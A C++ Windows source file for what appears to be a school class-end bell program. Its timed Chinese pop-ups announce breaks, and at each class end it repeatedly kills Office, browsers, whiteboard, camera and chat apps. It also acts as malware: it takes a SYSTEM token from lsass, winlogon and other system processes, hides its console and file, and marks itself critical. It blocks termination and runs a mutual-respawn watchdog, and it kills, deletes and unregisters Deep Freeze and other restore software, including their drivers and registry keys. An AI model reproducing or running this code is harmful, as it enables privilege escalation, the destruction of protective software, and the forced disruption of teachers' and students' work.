#define __USE_MINGW_ANSI_STDIO 1

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <cwchar>
#include <aclapi.h>

using namespace std;

#ifndef PROCESS_QUERY_LIMITED_INFORMATION
#define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
#endif

#define MAX_CLASS 64

typedef LONG (WINAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
typedef DWORD (WINAPI *pSetSecurityInfo)(HANDLE, SE_OBJECT_TYPE, SECURITY_INFORMATION, PSID, PSID, PACL, PACL);
typedef DWORD (WINAPI *pSetEntriesInAclA)(ULONG, PEXPLICIT_ACCESS_A, PACL, PACL *);
typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *pLookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL (WINAPI *pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef DWORD (WINAPI *pWTSGetActiveConsoleSessionId)();
typedef BOOL (WINAPI *pSetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD);
typedef BOOL (WINAPI *pCreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

volatile bool g_isRunning = true;
volatile bool g_isAlerting = false;
volatile bool g_shuttingDown = false;
volatile DWORD g_guardPid = 0;
int g_lastDay = -1;
HANDLE g_hSelfHandles[5] = {NULL};
HANDLE g_hShutdownEvent = NULL;

struct ClassTime {
	int startH, startM;
	int endH, endM;
	string tip;
};

int str_ieq(const char* a, const char* b) {
	while (*a && *b) {
		char ca = *a;
		char cb = *b;
		if (ca >= 'A' && ca <= 'Z') ca += 32;
		if (cb >= 'A' && cb <= 'Z') cb += 32;
		if (ca != cb) return 0;
		a++;
		b++;
	}
	return *a == *b;
}

void HideConsole() {
	HWND hwnd = GetConsoleWindow();
	if (hwnd != NULL) {
		ShowWindow(hwnd, SW_HIDE);
		LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
		style = (style & ~WS_EX_APPWINDOW) | WS_EX_TOOLWINDOW;
		SetWindowLong(hwnd, GWL_EXSTYLE, style);
	}
}

void SetBreakOnTermination(ULONG value) {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (hNtdll == NULL) return;
	pNtSetInformationProcess pFunc = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
	if (pFunc != NULL) {
		pFunc(GetCurrentProcess(), 0x1D, &value, sizeof(ULONG));
	}
	FreeLibrary(hNtdll);
}

bool KillProcessByName(const char* targetExe) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return false;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &pe32)) {
		CloseHandle(hSnapshot);
		return false;
	}
	bool killed = false;
	do {
		if (str_ieq(pe32.szExeFile, targetExe)) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL) {
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
				killed = true;
			}
		}
	} while (Process32Next(hSnapshot, &pe32));
	CloseHandle(hSnapshot);
	return killed;
}

void AttackAllRestoreSoftware() {
	const char* restoreProcs[] = {
		"DFServ.exe", "DFServEx.exe", "DeepFrz.exe", "FrzState.exe",
		"ShdServ.exe", "SVRestoreService.exe", "Shadow Defender.exe",
		"RRCli.exe", "RebootRestoreRx.exe", "RRService.exe",
		"XSVC.exe", "XunShan.exe", "XunShanService.exe",
		"OEasy.exe", "OEasySvc.exe", "OEasyService.exe",
		"TopDomain.exe", "TopDomainService.exe", "JiYu.exe",
		"LanStar.exe", "LanStarService.exe",
		"GHost.exe", "HDSafe.exe", "HDSafeService.exe"
	};
	for (int i = 0; i < (int)(sizeof(restoreProcs) / sizeof(restoreProcs[0])); i++) {
		KillProcessByName(restoreProcs[i]);
	}
	
	const char* restoreServices[] = {
		"DFServ", "DFServEx", "DeepFrz", "FrzState",
		"ShdServ", "SVRestoreService", "ShadowDefender",
		"RebootRestoreRx", "RRService",
		"XSVC", "XunShanService",
		"OEasySvc", "OEasyService",
		"TopDomainService", "JiYuService",
		"LanStarService", "HDSafeService"
	};
	for (int i = 0; i < (int)(sizeof(restoreServices) / sizeof(restoreServices[0])); i++) {
		char cmd[256];
		snprintf(cmd, sizeof(cmd), "sc stop %s", restoreServices[i]);
		WinExec(cmd, SW_HIDE);
		snprintf(cmd, sizeof(cmd), "sc delete %s", restoreServices[i]);
		WinExec(cmd, SW_HIDE);
	}
	
	const char* restoreRegKeys[] = {
		"HKLM\\SOFTWARE\\DeepFreeze",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DFServ",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DFServEx",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DeepFrz",
		"HKLM\\SOFTWARE\\Shadow Defender",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ShdServ",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SVRestoreService",
		"HKLM\\SOFTWARE\\RollBack Rx",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\RebootRestoreRx",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\RRService",
		"HKLM\\SOFTWARE\\XunShan",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\XSVC",
		"HKLM\\SOFTWARE\\OEasy",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\OEasySvc",
		"HKLM\\SOFTWARE\\TopDomain",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\TopDomainService",
		"HKLM\\SOFTWARE\\LanStar",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanStarService"
	};
	for (int i = 0; i < (int)(sizeof(restoreRegKeys) / sizeof(restoreRegKeys[0])); i++) {
		char cmd[512];
		snprintf(cmd, sizeof(cmd), "reg delete \"%s\" /f", restoreRegKeys[i]);
		WinExec(cmd, SW_HIDE);
	}
	
	const char* restoreDrivers[] = {
		"C:\\Windows\\System32\\drivers\\DeepFrz.sys",
		"C:\\Windows\\System32\\drivers\\DFServ.sys",
		"C:\\Windows\\System32\\drivers\\DFServEx.sys",
		"C:\\Windows\\System32\\drivers\\ssc.sys",
		"C:\\Windows\\System32\\drivers\\spp.sys",
		"C:\\Windows\\System32\\drivers\\shd.sys",
		"C:\\Windows\\System32\\drivers\\svrestore.sys",
		"C:\\Windows\\System32\\drivers\\rrc.sys",
		"C:\\Windows\\System32\\drivers\\xsvc.sys",
		"C:\\Windows\\System32\\drivers\\xsafe.sys",
		"C:\\Windows\\System32\\drivers\\oesy.sys",
		"C:\\Windows\\System32\\drivers\\tdsafe.sys",
		"C:\\Windows\\System32\\drivers\\hdsafe.sys"
	};
	for (int i = 0; i < (int)(sizeof(restoreDrivers) / sizeof(restoreDrivers[0])); i++) {
		DeleteFileA(restoreDrivers[i]);
	}
	
	for (int i = 0; i < 100; i++) {
		char path[MAX_PATH];
		snprintf(path, sizeof(path), "C:\\bypass_%d.tmp", i);
		HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) {
			DWORD written;
			WriteFile(hFile, "BYPASS", 6, &written, NULL);
			CloseHandle(hFile);
		}
	}
}

void EnableProcessProtection() {
	HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
	if (hAdvapi == NULL) return;
	
	pSetSecurityInfo _SetSecurityInfo = (pSetSecurityInfo)GetProcAddress(hAdvapi, "SetSecurityInfo");
	pSetEntriesInAclA _SetEntriesInAclA = (pSetEntriesInAclA)GetProcAddress(hAdvapi, "SetEntriesInAclA");
	
	char szPath[MAX_PATH];
	GetModuleFileNameA(NULL, szPath, MAX_PATH);
	SetFileAttributesA(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	
	SetBreakOnTermination(1);
	
	if (_SetSecurityInfo != NULL && _SetEntriesInAclA != NULL) {
		EXPLICIT_ACCESS_A ea;
		ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS_A));
		ea.grfAccessPermissions = PROCESS_TERMINATE;
		ea.grfAccessMode = DENY_ACCESS;
		ea.grfInheritance = NO_INHERITANCE;
		ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
		ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea.Trustee.ptstrName = (LPSTR)"Everyone";
		
		PACL pNewAcl = NULL;
		if (_SetEntriesInAclA(1, &ea, NULL, &pNewAcl) == ERROR_SUCCESS && pNewAcl != NULL) {
			_SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewAcl, NULL);
			LocalFree(pNewAcl);
		}
	}
	
	for (int i = 0; i < 5; i++) {
		DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &g_hSelfHandles[i], PROCESS_ALL_ACCESS, FALSE, 0);
	}
}

bool IsSystemUser() {
	char userName[256];
	DWORD size = sizeof(userName);
	if (GetUserNameA(userName, &size)) {
		if (str_ieq(userName, "SYSTEM")) {
			return true;
		}
	}
	return false;
}

void ElevateToSystem(bool isGuard) {
	HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
	HMODULE hKernel = LoadLibraryA("kernel32.dll");
	HMODULE hShell = LoadLibraryA("shell32.dll");
	if (hAdvapi == NULL || hKernel == NULL || hShell == NULL) return;
	
	pOpenProcessToken _OpenProcessToken = (pOpenProcessToken)GetProcAddress(hAdvapi, "OpenProcessToken");
	pLookupPrivilegeValueA _LookupPrivilegeValueA = (pLookupPrivilegeValueA)GetProcAddress(hAdvapi, "LookupPrivilegeValueA");
	pAdjustTokenPrivileges _AdjustTokenPrivileges = (pAdjustTokenPrivileges)GetProcAddress(hAdvapi, "AdjustTokenPrivileges");
	pDuplicateTokenEx _DuplicateTokenEx = (pDuplicateTokenEx)GetProcAddress(hAdvapi, "DuplicateTokenEx");
	pWTSGetActiveConsoleSessionId _WTSGetActiveConsoleSessionId = (pWTSGetActiveConsoleSessionId)GetProcAddress(hKernel, "WTSGetActiveConsoleSessionId");
	pSetTokenInformation _SetTokenInformation = (pSetTokenInformation)GetProcAddress(hAdvapi, "SetTokenInformation");
	pCreateProcessWithTokenW _CreateProcessWithTokenW = (pCreateProcessWithTokenW)GetProcAddress(hAdvapi, "CreateProcessWithTokenW");
	
	if (!_OpenProcessToken || !_LookupPrivilegeValueA || !_AdjustTokenPrivileges ||
		!_DuplicateTokenEx || !_WTSGetActiveConsoleSessionId || !_SetTokenInformation ||
		!_CreateProcessWithTokenW) {
		return;
	}
	
	BOOL isAdmin = FALSE;
	PSID adminGroup = NULL;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
								 0, 0, 0, 0, 0, 0, &adminGroup)) {
		CheckTokenMembership(NULL, adminGroup, &isAdmin);
		FreeSid(adminGroup);
	}
	if (!isAdmin) {
		wchar_t szPathW[MAX_PATH];
		GetModuleFileNameW(NULL, szPathW, MAX_PATH);
		if (isGuard) {
			ShellExecuteW(NULL, L"runas", szPathW, L"/guard", NULL, SW_SHOWNORMAL);
		} else {
			ShellExecuteW(NULL, L"runas", szPathW, NULL, NULL, SW_SHOWNORMAL);
		}
		ExitProcess(0);
	}
	
	HANDLE hSelfToken = NULL;
	if (_OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelfToken)) {
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		_LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		_AdjustTokenPrivileges(hSelfToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		
		_LookupPrivilegeValueA(NULL, SE_IMPERSONATE_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		_AdjustTokenPrivileges(hSelfToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		CloseHandle(hSelfToken);
	}
	
	HANDLE hDupToken = NULL;
	
	const char* targetProcs[] = {
		"services.exe",
		"wininit.exe",
		"spoolsv.exe",
		"svchost.exe",
		"lsass.exe",
		"winlogon.exe",
		"fontdrvhost.exe",
		"dwm.exe",
		"audiodg.exe",
		"SearchIndexer.exe",
		"WmiPrvSE.exe",
		"taskhostw.exe"
	};
	int targetCount = (int)(sizeof(targetProcs) / sizeof(targetProcs[0]));
	
	for (int t = 0; t < targetCount && hDupToken == NULL; t++) {
		DWORD pid = 0;
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) continue;
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe32)) {
			do {
				if (str_ieq(pe32.szExeFile, targetProcs[t])) {
					pid = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
		
		if (pid == 0) continue;
		
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
		if (hProcess == NULL) continue;
		
		HANDLE hToken = NULL;
		if (_OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
			if (_DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}
	
	if (hDupToken != NULL) {
		DWORD sessionId = _WTSGetActiveConsoleSessionId();
		if (sessionId != 0xFFFFFFFF) {
			_SetTokenInformation(hDupToken, TokenSessionId, &sessionId, sizeof(sessionId));
		}
		STARTUPINFOW si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		wchar_t desktop[] = L"winsta0\\default";
		si.lpDesktop = desktop;
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_SHOW;
		
		wchar_t szPathW[MAX_PATH];
		GetModuleFileNameW(NULL, szPathW, MAX_PATH);
		
		wchar_t cmdLine[512];
		wcsncpy(cmdLine, L"\"", 511);
		cmdLine[511] = L'\0';
		size_t curLen = wcslen(cmdLine);
		wcsncat(cmdLine, szPathW, 511 - curLen);
		curLen = wcslen(cmdLine);
		wcsncat(cmdLine, L"\"", 511 - curLen);
		if (isGuard) {
			curLen = wcslen(cmdLine);
			wcsncat(cmdLine, L" /guard", 511 - curLen);
		}
		
		if (_CreateProcessWithTokenW(hDupToken, 0, NULL, cmdLine, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			CloseHandle(hDupToken);
			ExitProcess(0);
		}
		CloseHandle(hDupToken);
	}
}

void KillAllPrograms() {
	const char* procList[] = {
		"POWERPNT.EXE", "WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE", "ONENOTE.EXE",
		"wps.exe", "wpp.exe", "et.exe",
		
		"SeewoService.exe", "SeewoAssistant.exe", "SeewoWhiteBoard.exe", "EasiNote.exe", "EasiNote5.exe", "Easinote.exe",
		"SeewoRemoteDesktop.exe", "SeewoCast.exe", "SeewoMonitor.exe", "SeewoLink.exe", "SeewoServiceApp.exe",
		"EasiCamera.exe", "EasiCamera3.exe", "SeewoCapture.exe",
		
		"HiteBoard.exe", "HiteAssistant.exe", "HiteService.exe", "HiteVision.exe", "HiteShow.exe", "HiteCamera.exe",
		"HiteCloud.exe", "HiteController.exe", "HiteRemote.exe", "HiteLink.exe", "HiteCast.exe", "HiteWhiteBoard.exe",
		
		"EloamView.exe", "EloamVideo.exe", "DocCamera.exe", "Vscanner.exe", "VscannerApp.exe", 
		"SmartCamera.exe", "UsbCamera.exe", "HighShot.exe", "FounderCamera.exe", "HCam.exe", 
		"PCCamera.exe", "CamApp.exe", "Visualizer.exe",
		
		"AirServer.exe", "ApowerMirror.exe", "LetsView.exe", "TotalControl.exe", "TC.exe", 
		"Zoom.exe", "TencentMeeting.exe", "Wemeet.exe", "DingTalk.exe",
		
		"WindowsCamera.exe", "AMCap.exe", "OBS.exe", "obs64.exe", 
		"chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe",
		"360se.exe", "360chrome.exe", "qqbrowser.exe", "sogouexplorer.exe", "opera.exe",
		
		"QQ.exe", "WeChat.exe"
	};
	for (int i = 0; i < (int)(sizeof(procList) / sizeof(procList[0])); i++) {
		KillProcessByName(procList[i]);
	}
}

DWORD WINAPI WarnThread(LPVOID lpParam) {
	char* msg = (char*)lpParam;
	Beep(1000, 200);
	Sleep(100);
	Beep(1000, 200);
	Sleep(100);
	Beep(1000, 200);
	MessageBoxA(NULL, msg, "[预警] 即将下课", MB_OK | MB_ICONEXCLAMATION | MB_TOPMOST | MB_SETFOREGROUND);
	free(msg);
	return 0;
}

DWORD WINAPI AlertThread(LPVOID lpParam) {
	char* msg = (char*)lpParam;
	while (g_isAlerting && g_isRunning) {
		Beep(800, 300);
		int ret = MessageBoxA(NULL, msg, "[防拖课] 下课时间到！", MB_OK | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND);
		if (ret == IDOK) {
			Sleep(1000);
		}
	}
	free(msg);
	return 0;
}

DWORD WINAPI KillLoopThread(LPVOID lpParam) {
	(void)lpParam;
	while (g_isAlerting && g_isRunning) {
		KillAllPrograms();
		Sleep(2000);
	}
	return 0;
}

DWORD WINAPI MainThread(LPVOID lpParam) {
	(void)lpParam;
	ClassTime schedule[] = {
		{8,15, 8,55, "第1节课下课！大课间20分钟"},
		{9,10, 9,50, "第2节课下课！课间15分钟"},
		{10,05,10,45,"第3节课下课！课间15分钟"},
		{11,00,11,40,"第4节课下课！午休开始"},
		{11,40,12,20,"午饭时间结束！"},
		{12,20,13,00,"午休时间结束！"},
		{13,00,13,40,"下午第1节下课！课间15分钟"},
		{13,55,14,35,"下午第2节下课！课间15分钟"},
		{14,50,15,30,"延时第1节下课！延时课间10分钟"},
		{15,40,17,40,"延时第2节课下课！放学时间到！"}
	};
	int totalClass = sizeof(schedule) / sizeof(schedule[0]);
	bool alertedWarning[MAX_CLASS] = {false};
	bool alertedEnd[MAX_CLASS] = {false};
	bool alertedClassStart[MAX_CLASS] = {false};
	
	long long shutdownSec = 17 * 3600 + 41 * 60;
	
	while (g_isRunning) {
		SYSTEMTIME st;
		GetLocalTime(&st);
		
		if (st.wDay != g_lastDay) {
			g_lastDay = st.wDay;
			memset(alertedWarning, 0, sizeof(alertedWarning));
			memset(alertedEnd, 0, sizeof(alertedEnd));
			memset(alertedClassStart, 0, sizeof(alertedClassStart));
		}
		
		long long nowTotalSec = (long long)st.wHour * 3600 + st.wMinute * 60 + st.wSecond;
		
		if (nowTotalSec >= shutdownSec) {
			g_shuttingDown = true;
			g_isRunning = false;
			g_isAlerting = false;
			
			if (g_hShutdownEvent != NULL) {
				SetEvent(g_hShutdownEvent);
			}
			
			HANDLE hShutdown = CreateFileA("C:\\Windows\\Temp\\yrl_shutdown.tmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hShutdown != INVALID_HANDLE_VALUE) {
				CloseHandle(hShutdown);
			}
			
			HWND hwndAlert = FindWindowA(NULL, "[防拖课] 下课时间到！");
			if (hwndAlert != NULL) PostMessage(hwndAlert, WM_CLOSE, 0, 0);
			HWND hwndWarn = FindWindowA(NULL, "[预警] 即将下课");
			if (hwndWarn != NULL) PostMessage(hwndWarn, WM_CLOSE, 0, 0);
			
			Sleep(1000);
			SetBreakOnTermination(0);
			ExitProcess(0);
		}
		
		for (int i = 0; i < totalClass; i++) {
			long long startTotalSec = (long long)schedule[i].startH * 3600 + schedule[i].startM * 60;
			long long endTotalSec = (long long)schedule[i].endH * 3600 + schedule[i].endM * 60;
			long long warnTotalSec = endTotalSec - 15;
			
			if (nowTotalSec >= startTotalSec && nowTotalSec < startTotalSec + 60 && !alertedClassStart[i]) {
				alertedClassStart[i] = true;
				if (g_isAlerting) {
					g_isAlerting = false;
					HWND hwnd = FindWindowA(NULL, "[防拖课] 下课时间到！");
					if (hwnd != NULL) PostMessage(hwnd, WM_CLOSE, 0, 0);
				}
			}
			
			if (nowTotalSec >= warnTotalSec && nowTotalSec < warnTotalSec + 60 && !alertedWarning[i]) {
				alertedWarning[i] = true;
				char* msg = (char*)malloc(128);
				if (msg != NULL) {
					strcpy(msg, "预警：距离下课还有15秒！请立刻保存课件！");
					HANDLE hWarn = CreateThread(NULL, 0, WarnThread, msg, 0, NULL);
					if (hWarn == NULL) free(msg);
					else CloseHandle(hWarn);
				}
			}
			
			if (nowTotalSec >= endTotalSec && nowTotalSec < endTotalSec + 60 && !alertedEnd[i]) {
				alertedEnd[i] = true;
				HWND hwndWarn = FindWindowA(NULL, "[预警] 即将下课");
				if (hwndWarn != NULL) PostMessage(hwndWarn, WM_CLOSE, 0, 0);
				
				g_isAlerting = true;
				
				char* msg = (char*)malloc(256);
				if (msg != NULL) {
					strcpy(msg, schedule[i].tip.c_str());
					HANDLE hAlert = CreateThread(NULL, 0, AlertThread, msg, 0, NULL);
					if (hAlert == NULL) free(msg);
					else CloseHandle(hAlert);
				}
				
				HANDLE hKill = CreateThread(NULL, 0, KillLoopThread, NULL, 0, NULL);
				if (hKill != NULL) CloseHandle(hKill);
			}
		}
		Sleep(200);
	}
	return 0;
}

DWORD WINAPI GuardMonitorThread(LPVOID lpParam) {
	(void)lpParam;
	while (!g_shuttingDown) {
		Sleep(10);
		if (g_hShutdownEvent != NULL && WaitForSingleObject(g_hShutdownEvent, 0) == WAIT_OBJECT_0) {
			SetBreakOnTermination(0);
			ExitProcess(0);
		}
		if (g_guardPid != 0) {
			HANDLE hGuard = OpenProcess(SYNCHRONIZE, FALSE, g_guardPid);
			if (hGuard == NULL) {
				if (g_shuttingDown) break;
				wchar_t szPathW[MAX_PATH];
				GetModuleFileNameW(NULL, szPathW, MAX_PATH);
				wchar_t cmdLineW[512];
				wcsncpy(cmdLineW, L"\"", 511);
				cmdLineW[511] = L'\0';
				size_t curLen = wcslen(cmdLineW);
				wcsncat(cmdLineW, szPathW, 511 - curLen);
				curLen = wcslen(cmdLineW);
				wcsncat(cmdLineW, L"\" /guard", 511 - curLen);
				STARTUPINFOW si;
				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);
				PROCESS_INFORMATION pi;
				ZeroMemory(&pi, sizeof(pi));
				if (CreateProcessW(NULL, cmdLineW, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
					g_guardPid = pi.dwProcessId;
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
				}
			} else {
				CloseHandle(hGuard);
			}
		}
	}
	return 0;
}

int main(int argc, char* argv[]) {
	bool isGuard = false;
	if (argc > 1 && strcmp(argv[1], "/guard") == 0) {
		isGuard = true;
	}
	
	if (!IsSystemUser()) {
		ElevateToSystem(isGuard);
		ExitProcess(0);
	}
	
	HideConsole();
	SetConsoleOutputCP(936);
	
	if (isGuard) {
		for (int i = 0; i < 5 && g_hShutdownEvent == NULL; i++) {
			g_hShutdownEvent = OpenEventA(SYNCHRONIZE, FALSE, "Global\\YRL_SHUTDOWN_EVENT");
			if (g_hShutdownEvent == NULL) Sleep(500);
		}
	} else {
		DeleteFileA("C:\\Windows\\Temp\\yrl_shutdown.tmp");
		g_hShutdownEvent = CreateEventA(NULL, TRUE, FALSE, "Global\\YRL_SHUTDOWN_EVENT");
	}
	
	EnableProcessProtection();
	AttackAllRestoreSoftware();
	
	if (isGuard) {
		while (true) {
			Sleep(10);
			if (g_hShutdownEvent != NULL && WaitForSingleObject(g_hShutdownEvent, 0) == WAIT_OBJECT_0) {
				SetBreakOnTermination(0);
				ExitProcess(0);
			}
			if (GetFileAttributesA("C:\\Windows\\Temp\\yrl_shutdown.tmp") != INVALID_FILE_ATTRIBUTES) {
				SetBreakOnTermination(0);
				ExitProcess(0);
			}
			HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, "Global\\YRL_MAIN_MUTEX");
			if (hMutex == NULL) {
				if (g_shuttingDown) break;
				wchar_t szPathW[MAX_PATH];
				GetModuleFileNameW(NULL, szPathW, MAX_PATH);
				wchar_t cmdLineW[512];
				wcsncpy(cmdLineW, L"\"", 511);
				cmdLineW[511] = L'\0';
				size_t curLen = wcslen(cmdLineW);
				wcsncat(cmdLineW, szPathW, 511 - curLen);
				curLen = wcslen(cmdLineW);
				wcsncat(cmdLineW, L"\"", 511 - curLen);
				STARTUPINFOW si;
				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);
				PROCESS_INFORMATION pi;
				ZeroMemory(&pi, sizeof(pi));
				if (CreateProcessW(NULL, cmdLineW, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
				}
			} else {
				CloseHandle(hMutex);
			}
		}
	} else {
		HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\YRL_MAIN_MUTEX");
		if (hMutex == NULL) {
			ExitProcess(0);
		}
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			CloseHandle(hMutex);
			ExitProcess(0);
		}
		
		wchar_t szPathW[MAX_PATH];
		GetModuleFileNameW(NULL, szPathW, MAX_PATH);
		wchar_t cmdLineW[512];
		wcsncpy(cmdLineW, L"\"", 511);
		cmdLineW[511] = L'\0';
		size_t curLen = wcslen(cmdLineW);
		wcsncat(cmdLineW, szPathW, 511 - curLen);
		curLen = wcslen(cmdLineW);
		wcsncat(cmdLineW, L"\" /guard", 511 - curLen);
		STARTUPINFOW si;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		PROCESS_INFORMATION pi;
		ZeroMemory(&pi, sizeof(pi));
		if (CreateProcessW(NULL, cmdLineW, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			g_guardPid = pi.dwProcessId;
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		
		HANDLE hMonitor = CreateThread(NULL, 0, GuardMonitorThread, NULL, 0, NULL);
		HANDLE hMain = CreateThread(NULL, 0, MainThread, NULL, 0, NULL);
		WaitForSingleObject(hMain, INFINITE);
		CloseHandle(hMain);
		CloseHandle(hMonitor);
		CloseHandle(hMutex);
	}
	ExitProcess(0);
}
